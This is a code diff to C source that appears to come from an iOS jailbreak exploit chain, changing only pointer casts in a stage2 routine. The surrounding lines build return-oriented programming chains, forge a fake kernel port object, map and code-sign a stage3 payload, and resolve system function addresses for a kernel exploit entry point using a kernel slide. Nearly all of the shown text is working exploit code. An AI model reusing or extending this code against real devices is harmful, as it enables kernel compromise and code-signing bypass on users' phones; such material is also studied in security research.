@@ -571,7 +571,7 @@ void stage2(jake_img_t kernel_symbols, offset_struct_t * offsets,char * base_dir
 	SET_ROP_VAR64_TO_VAR_W_OFFSET("ool_msg",offsetof(ool_message_struct,desc[0].address),"tmp_port",0);
 
 	kport_t * fakeport = malloc(sizeof(kport_t));
-	memset(fakeport,0,sizeof(kport_t));
+	memset((void*)fakeport,0,sizeof(kport_t));
 	fakeport->ip_bits = IO_BITS_ACTIVE | IOT_PORT | IKOT_NONE;
 	fakeport->ip_references = 100;
 	fakeport->ip_lock.type = 0x11;
@@ -749,8 +749,8 @@ void stage2(jake_img_t kernel_symbols, offset_struct_t * offsets,char * base_dir
     get_property_msg->request.Head.msgh_reserved = 0;
 	get_property_msg->request.Head.msgh_id = 2812;
 	get_property_msg->request.dataCnt = 4096;
-	snprintf(&get_property_msg->request.property_name,12,"boot-args");
-	get_property_msg->request.property_nameCnt = strlen(&get_property_msg->request.property_name);
+	snprintf((char*)&get_property_msg->request.property_name,12,"boot-args");
+	get_property_msg->request.property_nameCnt = strlen((char*)&get_property_msg->request.property_name);
 
 	DEFINE_ROP_VAR("get_property_msg",sizeof(union get_property_union),get_property_msg);
 	ROP_VAR_CPY_W_OFFSET("get_property_msg",offsetof(union get_property_union,request.Head.msgh_local_port),"reply_port",0,sizeof(mach_port_t));
@@ -1194,7 +1194,7 @@ _STRUCT_ARM_THREAD_STATE64
 	CALL("__mmap",offsets->stage3_loadaddr,offsets->stage3_size,PROT_READ|PROT_WRITE,MAP_FIXED|MAP_PRIVATE,0,0,0,0);
 	fsignatures_t * siginfo = malloc(sizeof(fsignatures_t));
 	memset(siginfo,0,sizeof(fsignatures_t));
-	siginfo->fs_blob_start = offsets->stage3_loadaddr + offsets->stage3_CS_blob;
+	siginfo->fs_blob_start = (void*)(offsets->stage3_loadaddr + offsets->stage3_CS_blob);
 	siginfo->fs_blob_size = offsets->stage3_CS_blob_size;
 	DEFINE_ROP_VAR("siginfo",sizeof(fsignatures_t),siginfo);
 	ROP_VAR_ARG_HOW_MANY(2);
@@ -1308,18 +1308,18 @@ _STRUCT_ARM_THREAD_STATE64
 	lib_offsets->struct_offsets.task_all_image_info_addr = 0x3a8;
 	lib_offsets->struct_offsets.task_all_image_info_size = 0x3b0;
 	// iosurface stuff isn't set and also isn't used
-	lib_offsets->userland_funcs.write = get_addr_from_name(offsets,"write") - 0x180000000 + offsets->new_cache_addr;
-	lib_offsets->userland_funcs.IOConnectTrap6 = get_addr_from_name(offsets,"IOConnectTrap6") - 0x180000000 + offsets->new_cache_addr;
-	lib_offsets->userland_funcs.mach_ports_lookup = get_addr_from_name(offsets,"mach_ports_lookup") - 0x180000000 + offsets->new_cache_addr;
-	lib_offsets->userland_funcs.mach_task_self = get_addr_from_name(offsets,"mach_task_self") - 0x180000000 + offsets->new_cache_addr;
-	lib_offsets->userland_funcs.mach_vm_remap = offsets->raw_mach_vm_remap_call - 0x180000000 + offsets->new_cache_addr;
-	lib_offsets->userland_funcs.mach_port_destroy = get_addr_from_name(offsets,"mach_port_destroy") - 0x180000000 + offsets->new_cache_addr;
-	lib_offsets->userland_funcs.mach_port_deallocate = get_addr_from_name(offsets,"mach_port_deallocate") - 0x180000000 + offsets->new_cache_addr;
-	lib_offsets->userland_funcs.mach_port_allocate = get_addr_from_name(offsets,"mach_port_allocate") - 0x180000000 + offsets->new_cache_addr;
-	lib_offsets->userland_funcs.mach_port_insert_right = get_addr_from_name(offsets,"mach_port_insert_right") - 0x180000000 + offsets->new_cache_addr;
-	lib_offsets->userland_funcs.mach_ports_register = get_addr_from_name(offsets,"mach_ports_register") - 0x180000000 + offsets->new_cache_addr;
-	lib_offsets->userland_funcs.mach_msg = get_addr_from_name(offsets,"mach_msg") - 0x180000000 + offsets->new_cache_addr;
-	lib_offsets->userland_funcs.posix_spawn = get_addr_from_name(offsets,"posix_spawn") - 0x180000000 + offsets->new_cache_addr;
+	lib_offsets->userland_funcs.write = (void*)(get_addr_from_name(offsets,"write") - 0x180000000 + offsets->new_cache_addr);
+	lib_offsets->userland_funcs.IOConnectTrap6 = (void*)(get_addr_from_name(offsets,"IOConnectTrap6") - 0x180000000 + offsets->new_cache_addr);
+	lib_offsets->userland_funcs.mach_ports_lookup = (void*)(get_addr_from_name(offsets,"mach_ports_lookup") - 0x180000000 + offsets->new_cache_addr);
+	lib_offsets->userland_funcs.mach_task_self = (void*)(get_addr_from_name(offsets,"mach_task_self") - 0x180000000 + offsets->new_cache_addr);
+	lib_offsets->userland_funcs.mach_vm_remap = (void*)(offsets->raw_mach_vm_remap_call - 0x180000000 + offsets->new_cache_addr);
+	lib_offsets->userland_funcs.mach_port_destroy = (void*)(get_addr_from_name(offsets,"mach_port_destroy") - 0x180000000 + offsets->new_cache_addr);
+	lib_offsets->userland_funcs.mach_port_deallocate = (void*)(get_addr_from_name(offsets,"mach_port_deallocate") - 0x180000000 + offsets->new_cache_addr);
+	lib_offsets->userland_funcs.mach_port_allocate = (void*)(get_addr_from_name(offsets,"mach_port_allocate") - 0x180000000 + offsets->new_cache_addr);
+	lib_offsets->userland_funcs.mach_port_insert_right = (void*)(get_addr_from_name(offsets,"mach_port_insert_right") - 0x180000000 + offsets->new_cache_addr);
+	lib_offsets->userland_funcs.mach_ports_register = (void*)(get_addr_from_name(offsets,"mach_ports_register") - 0x180000000 + offsets->new_cache_addr);
+	lib_offsets->userland_funcs.mach_msg = (void*)(get_addr_from_name(offsets,"mach_msg") - 0x180000000 + offsets->new_cache_addr);
+	lib_offsets->userland_funcs.posix_spawn = (void*)(get_addr_from_name(offsets,"posix_spawn") - 0x180000000 + offsets->new_cache_addr);
 	DEFINE_ROP_VAR("lib_offsets",sizeof(offsets_t),lib_offsets);
 	// jump void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t ip_kobject_client_port_addr,uint64_t our_task_addr,uint64_t kslide,uint64_t the_one,offsets_t * offsets)
 	ROP_VAR_ARG_HOW_MANY(7);
